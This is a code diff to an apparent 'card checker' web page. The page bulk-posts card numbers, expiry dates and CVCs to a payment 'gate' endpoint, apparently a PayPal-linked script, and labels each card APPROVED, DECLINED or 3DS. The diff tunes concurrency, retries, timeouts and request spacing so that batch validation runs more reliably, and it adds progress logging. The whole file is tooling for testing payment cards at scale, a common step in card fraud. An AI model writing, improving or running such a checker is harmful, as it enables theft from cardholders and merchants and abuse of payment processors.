@@ -200,6 +200,7 @@ try {
                 </button>
             </div>
             <div class="loader" id="loader"></div>
+            <div id="statusLog" class="text-sm text-gray-600 mt-2"></div> <!-- Added for progress feedback -->
         </div>
 
         <div class="card glass p-6">
@@ -391,8 +392,8 @@ try {
                         let isStopping = false;
                         let activeRequests = 0;
                         let cardQueue = [];
-                        const MAX_CONCURRENT = 3;
-                        const MAX_RETRIES = 1;
+                        const MAX_CONCURRENT = 2; // Reduced to 2 to lower server load
+                        const MAX_RETRIES = 2; // Increased retries to handle intermittent failures
                         let abortControllers = [];
                         let totalCards = 0;
                         let chargedCards = JSON.parse(sessionStorage.getItem(`chargedCards-${sessionId}`) || '[]');
@@ -580,13 +581,16 @@ try {
                                 formData.append('card[exp_year]', normalizedYear);
                                 formData.append('card[cvc]', card.cvc);
 
+                                $('#statusLog').text(`Processing card: ${card.displayCard}`); // Update status log
+                                console.log(`Starting request for card: ${card.displayCard}`); // Debug log
+
                                 $.ajax({
                                     url: $('#gate').val(),
                                     method: 'POST',
                                     data: formData,
                                     processData: false,
                                     contentType: false,
-                                    timeout: 180000, // Adjusted to match paypal1$.php timeout of 180 seconds
+                                    timeout: 300000, // Increased to 300 seconds (5 minutes) to handle long delays
                                     signal: controller.signal,
                                     success: function(response) {
                                         let status = 'DECLINED';
@@ -604,6 +608,7 @@ try {
                                             else if (response.includes('Approved! - AVS')) status = 'APPROVED';
                                             else if (response.includes('OTP! - 3D')) status = '3DS';
                                         }
+                                        console.log(`Completed request for card: ${card.displayCard}, Status: ${status}`); // Debug log
                                         resolve({
                                             status: status,
                                             response: jsonResponse ? jsonResponse.response || response : response,
@@ -612,10 +617,12 @@ try {
                                         });
                                     },
                                     error: function(xhr) {
+                                        $('#statusLog').text(`Error on card: ${card.displayCard} - ${xhr.statusText} (HTTP ${xhr.status})`); // Update status log
+                                        console.error(`Error for card: ${card.displayCard}, Status: ${xhr.status}, Text: ${xhr.statusText}`); // Debug log
                                         if (xhr.statusText === 'abort') {
                                             resolve(null);
                                         } else if ((xhr.status === 0 || xhr.status >= 500) && retryCount < MAX_RETRIES && isProcessing) {
-                                            setTimeout(() => processCard(card, controller, retryCount + 1).then(resolve), 1000);
+                                            setTimeout(() => processCard(card, controller, retryCount + 1).then(resolve), 2000); // Increased retry delay
                                         } else {
                                             resolve({
                                                 status: 'DECLINED',
@@ -697,6 +704,7 @@ try {
                             $('#stopBtn').prop('disabled', false);
                             $('#loader').show();
                             $('#resultColumn').addClass('hidden');
+                            $('#statusLog').text('Starting processing...'); // Initial status
 
                             let requestIndex = 0;
 
@@ -707,7 +715,7 @@ try {
                                     const controller = new AbortController();
                                     abortControllers.push(controller);
 
-                                    await new Promise(resolve => setTimeout(resolve, requestIndex * 200));
+                                    await new Promise(resolve => setTimeout(resolve, requestIndex * 500)); // Increased delay between requests
                                     requestIndex++;
 
                                     processCard(card, controller).then(result => {
@@ -749,7 +757,7 @@ try {
                                     });
                                 }
                                 if (isProcessing) {
-                                    await new Promise(resolve => setTimeout(resolve, 5));
+                                    await new Promise(resolve => setTimeout(resolve, 10));
                                 }
                             }
                         }
@@ -765,6 +773,7 @@ try {
                             $('#loader').hide();
                             $('#cards').val('');
                             $('#card-count').text('0 valid cards detected');
+                            $('#statusLog').text('Processing completed.'); // Update status
                             Swal.fire({
                                 title: 'Processing complete!',
                                 text: 'All cards have been checked. See the results in the sidebar.',
@@ -791,6 +800,7 @@ try {
                             $('#startBtn').prop('disabled', false);
                             $('#stopBtn').prop('disabled', true);
                             $('#loader').hide();
+                            $('#statusLog').text('Processing stopped.'); // Update status
                             Swal.fire({
                                 title: 'Stopped!',
                                 text: 'Processing has been stopped',
